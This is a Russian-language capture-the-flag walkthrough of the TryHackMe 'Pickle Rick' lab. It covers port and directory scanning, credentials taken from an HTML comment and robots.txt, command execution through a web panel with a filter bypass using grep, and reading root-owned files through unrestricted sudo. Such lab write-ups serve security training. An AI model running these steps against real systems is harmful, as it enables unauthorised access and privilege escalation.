<div align="center">

# Pickle Rick

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/picklerick)![Category](https://img.shields.io/badge/Web-000000?style=for-the-badge&logoColor=ff0000)![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)
</div> <br/>

## `./recon`

Проведено сканирование портов через nmap:

```bash
nmap -sT <ip>

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Обнаружены открытые порты 22 (ssh) и 80 (http)

Просмотрена главная страница на 80 порту

```bash
curl <ip>
```

В HTML-комментарии найдено имя пользователя

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

Попытка подключения по ssh с этим именем

```bash
ssh R1ckRul3s@<ip>

Permission denied (publickey).
```

Вход по паролю отключён, доступ только по ключу. Вернемся к 80 порту

<br/>

## `./enum`

Запущен gobuster для поиска директорий и файлов

```bash
gobuster dir -u http://<ip> --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x http,php

/assets               (Status: 301)
/clue.txt             (Status: 200)
/robots.txt           (Status: 200)
/portal.php           (Status: 302) [--> /login.php]
/login.php            (Status: 200)
```

Проверен robots.txt

```bash
curl <ip>/robots.txt

Wubbalubbadubdub
```

Строка похожа на пароль. На странице login.php найдена форма с полями username и password

<br/>

## `./access`

Данные отправлены на login.php, cookie сохранена

```bash
curl -c cookies.txt -d "username=R1ckRul3s&password=Wubbalubbadubdub&sub=execute" http://<ip>/login.php
```

С cookie выполнен запрос к portal.php

```bash
curl -b cookies.txt http://<ip>/portal.php
```

На странице найдена форма для выполнения команд. Также в комментарии обнаружена строка в base64

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

После нескольких итераций декодирования получен текст "rabbit hole" — тупик Вернемся к форме команд

<br/>

## `./command-panel`

Выполнена команда ls

```bash
curl -b cookies.txt -d "command=ls&sub=execute" http://<ip>/portal.php

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Попытка прочитать файл через cat

```bash
curl -b cookies.txt -d "command=cat%20Sup3rS3cretPickl3Ingred.txt&sub=execute" http://<ip>/portal.php

Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

cat заблокирован Попытка через grep

```bash
curl -b cookies.txt -d "command=grep%20''%20Sup3rS3cretPickl3Ingred.txt&sub=execute" http://<ip>/portal.php
```

Первый ингредиент получен!

<br/>

## `./environment`

```
whoami → www-data
pwd    → /var/www/html
```

Просмотрено содержимое корня файловой системы — стандартный набор системных директорий, ничего необычного

<br/>

## `./privesc`

Проверены права через sudo -l

```bash
curl -b cookies.txt -d "command=sudo%20-l&sub=execute" http://<ip>/portal.php

User www-data may run the following commands on ip-10-129-134-109:
    (ALL) NOPASSWD: ALL
```

Доступ к sudo не ограничен. В /root найден файл 3rd.txt, прочитан через grep тем же способом, что и раньше Второй ингредиент получен!

<br/>

## `./final-ingredient`

В /home обнаружена директория, связанная со вторым ингредиентом по названию. Прямой доступ к содержимому не сработал. Содержимое прочитано рекурсивно через grep

```bash
curl -b cookies.txt -d 'command=sudo grep -r "" /home/rick/"second"*&sub=execute' http://<ip>/portal.php
```

Третий ингредиент получен!
